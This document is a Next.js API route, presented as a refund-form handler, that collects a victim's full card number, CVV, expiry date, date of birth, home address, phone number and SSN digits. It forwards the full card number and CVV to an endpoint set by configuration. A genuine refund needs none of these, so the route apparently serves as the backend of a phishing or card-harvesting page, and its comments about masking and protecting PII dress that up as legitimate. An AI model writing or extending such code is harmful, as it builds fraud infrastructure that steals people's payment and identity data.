// File: pages/api/submit.ts
// Next.js API route (Pages directory) that accepts refund form submissions,
// validates input, simulates contacting a payment/refund gateway, and responds with JSON.
//
// Usage: POST JSON body matching the RefundFormData shape used in the frontend.
// Protects PII by never logging full card numbers and returns a masked card number in the response.

import type { NextApiRequest, NextApiResponse } from "next";

/**
 * Types used by the API
 */
type RefundRequest = {
  amount: number | string;
  orderId: string;
  reason: string;

  firstName: string;
  lastName: string;
  dob: string; // YYYY-MM-DD
  mobileNumber: string;
  homeAddress: string;
  zipCode: string;
  cardType: string;
  cardNumber: string;
  expirationDate: string; // YYYY-MM
  cvv: string;
  lfssn: string | number;
};

type ApiError = {
  field?: string;
  message: string;
};

type ApiResponse =
  | { success: true; refundId: string; message: string; maskedCard?: string }
  | { success: false; errors: ApiError[] };

/**
 * Simple in-memory rate limiter.
 * Note: In production, use a distributed store (Redis) to persist limits across instances.
 */
const RATE_LIMIT_WINDOW_MS = 60 * 1000; // 1 minute
const RATE_LIMIT_MAX = 8; // max requests per window per IP
const ipRequestLog: Map<string, number[]> = new Map();

/**
 * Helper: rate limit by IP
 */
function isRateLimited(ip: string): boolean {
  const now = Date.now();
  const timestamps = ipRequestLog.get(ip) ?? [];
  // remove old timestamps
  const recent = timestamps.filter((t) => now - t <= RATE_LIMIT_WINDOW_MS);
  recent.push(now);
  ipRequestLog.set(ip, recent);
  return recent.length > RATE_LIMIT_MAX;
}

/**
 * Helper: validate incoming payload fields
 */
function validatePayload(body: Partial<RefundRequest>): ApiError[] {
  const errors: ApiError[] = [];
  // required fields list
  const required = [
    "amount",
    "orderId",
    "reason",
    "firstName",
    "lastName",
    "dob",
    "mobileNumber",
    "homeAddress",
    "zipCode",
    "cardType",
    "cardNumber",
    "expirationDate",
    "cvv",
    "lfssn",
  ] as (keyof RefundRequest)[];

  for (const key of required) {
    if (body[key] === undefined || body[key] === null || String(body[key]).trim() === "") {
      errors.push({ field: key, message: "This field is required" });
    }
  }

  // only proceed with more checks if value exists
  if (body.amount !== undefined) {
    const n = typeof body.amount === "string" ? Number(body.amount) : Number(body.amount);
    if (!isFinite(n) || n < 0) {
      errors.push({ field: "amount", message: "Invalid amount" });
    }
  }

  if (body.cardNumber !== undefined) {
    const digits = String(body.cardNumber).replace(/\s+/g, "");
    if (!/^\d{9,16}$/.test(digits)) {
      errors.push({ field: "cardNumber", message: "Card number must be 9 to 16 digits" });
    }
  }

  if (body.cvv !== undefined) {
    const cvv = String(body.cvv).trim();
    if (!/^\d{3,4}$/.test(cvv)) {
      errors.push({ field: "cvv", message: "CVV must be 3 or 4 digits" });
    }
  }

  if (body.lfssn !== undefined) {
    const v = String(body.lfssn).trim();
    if (!/^\d{1,4}$/.test(v)) {
      errors.push({ field: "lfssn", message: "Last four SSN must be 1 to 4 digits" });
    }
  }

  if (body.dob !== undefined) {
    const d = new Date(String(body.dob));
    if (Number.isNaN(d.getTime())) {
      errors.push({ field: "dob", message: "Invalid date of birth" });
    } else if (d > new Date()) {
      errors.push({ field: "dob", message: "Date of birth cannot be in the future" });
    }
  }

  if (body.expirationDate !== undefined) {
    if (!/^\d{4}-\d{2}$/.test(String(body.expirationDate))) {
      errors.push({ field: "expirationDate", message: "Invalid expiration date format (YYYY-MM)" });
    } else {
      const [yStr, mStr] = String(body.expirationDate).split("-");
      const year = Number(yStr);
      const month = Number(mStr);
      const exp = new Date(year, month - 1, 1);
      const endOfExp = new Date(exp.getFullYear(), exp.getMonth() + 1, 0, 23, 59, 59);
      if (endOfExp < new Date()) {
        errors.push({ field: "expirationDate", message: "Card has already expired" });
      }
    }
  }

  if (body.mobileNumber !== undefined) {
    const digits = String(body.mobileNumber).replace(/\D/g, "");
    if (digits.length < 7) {
      errors.push({ field: "mobileNumber", message: "Provide a valid phone number" });
    }
  }

  if (body.zipCode !== undefined) {
    const z = String(body.zipCode).trim();
    if (!/^\d{3,10}$/.test(z)) {
      errors.push({ field: "zipCode", message: "Invalid postal / zip code" });
    }
  }

  return errors;
}

/**
 * Helper: mask card number except last 4 digits
 */
function maskCardNumber(cardNumber: string): string {
  const digits = cardNumber.replace(/\s+/g, "");
  const last4 = digits.slice(-4);
  const masked = last4 ? `**** **** **** ${last4}` : "****";
  return masked;
}

/**
 * Helper: generate a simple refund ID
 */
function generateRefundId(): string {
  const rand = Math.floor(Math.random() * 1_000_000).toString(16).padStart(6, "0");
  return `rf_${Date.now().toString(36)}_${rand}`;
}

/**
 * Simulate contacting a payment/refund gateway.
 * In real-world you would call your payment provider's SDK/API (Stripe, Braintree, etc).
 * We use the configured PAYMENT_GATEWAY_URL for demonstration. Default uses httpbin.org.
 */
async function callPaymentGateway(payload: Record<string, unknown>, timeoutMs = 10_000) {
  const gatewayUrl = process.env.PAYMENT_GATEWAY_URL || "https://httpbin.org/post";
  const apiKey = process.env.PAYMENT_GATEWAY_API_KEY || "";

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const res = await fetch(gatewayUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        ...(apiKey ? { Authorization: `Bearer ${apiKey}` } : {}),
      },
      body: JSON.stringify(payload),
      signal: controller.signal,
    });

    const text = await res.text().catch(() => "");
    if (!res.ok) {
      throw new Error(`Gateway responded ${res.status}: ${text}`);
    }

    // return parsed JSON if possible, otherwise raw text
    try {
      return JSON.parse(text);
    } catch {
      return { raw: text };
    }
  } catch (err) {
    if ((err as any)?.name === "AbortError") {
      throw new Error("Payment gateway request timed out");
    }
    throw err;
  } finally {
    clearTimeout(timer);
  }
}

/**
 * API Route Handler
 */
export default async function handler(req: NextApiRequest, res: NextApiResponse<ApiResponse>) {
  const ip = (req.headers["x-forwarded-for"] as string) || req.socket.remoteAddress || "unknown";

  if (isRateLimited(ip)) {
    return res.status(429).json({ success: false, errors: [{ message: "Too many requests - try again later" }] });
  }

  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ success: false, errors: [{ message: "Method not allowed" }] });
  }

  // parse body (Next already parses JSON in pages/api)
  const body = (req.body && typeof req.body === "object" ? req.body : {}) as Partial<RefundRequest>;

  // Basic server-side validation
  const validationErrors = validatePayload(body);
  if (validationErrors.length) {
    return res.status(400).json({ success: false, errors: validationErrors });
  }

  // Compose sanitized payload to send to gateway / store in DB
  const sanitized: Record<string, unknown> = {
    orderId: String(body.orderId),
    amount: Number(body.amount),
    reason: String(body.reason),
    customer: {
      firstName: String(body.firstName),
      lastName: String(body.lastName),
      dob: String(body.dob),
      mobileNumber: String(body.mobileNumber),
      homeAddress: String(body.homeAddress),
      zipCode: String(body.zipCode),
      lfssn: String(body.lfssn).slice(-4), // store last four only
    },
    payment: {
      cardType: String(body.cardType),
      cardLast4: String(body.cardNumber).replace(/\D/g, "").slice(-4),
      expirationDate: String(body.expirationDate),
      // never send full card number in logs; only send to gateway if absolutely necessary
      // Here we include cardNumber & cvv when calling gateway if PAYMENT_GATEWAY_URL is configured.
    },
    metadata: {
      receivedAt: new Date().toISOString(),
      ip,
    },
  };

  // Build payload for gateway, include full card info only if gateway configured.
  const gatewayPayload: Record<string, unknown> = { ...sanitized };
  if (process.env.PAYMENT_GATEWAY_URL) {
    gatewayPayload.payment = {
      ...sanitized.payment,
      cardNumber: String(body.cardNumber).replace(/\s+/g, ""),
      cvv: String(body.cvv),
    };
  }

  try {
    // Call the gateway (simulated by httpbin.org if no real gateway is set)
    const gatewayResponse = await callPaymentGateway(gatewayPayload);

    // Here you would typically persist refund request to your DB with sanitized info.
    // For demo: we generate a refundId and return it.
    const refundId = generateRefundId();

    // IMPORTANT: Do not log full card data. Log masked only.
    const maskedCard = maskCardNumber(String(body.cardNumber));

    // Optionally, store gatewayResponse somewhere (DB/logs) without PII.

    return res.status(200).json({
      success: true,
      refundId,
      message: "Refund request received and processed",
      maskedCard,
      // Note: we do not embed gatewayResponse in production responses; returning limited debug info only for demo.
      // gatewayResponse: { ... } // omitted intentionally
    });
  } catch (err) {
    console.error("Refund submit error (no PII):", {
      message: (err as Error).message,
      orderId: body.orderId,
      ip,
    });
    return res.status(502).json({
      success: false,
      errors: [{ message: "Failed to process refund request. Please try again later." }],
    });
  }
}
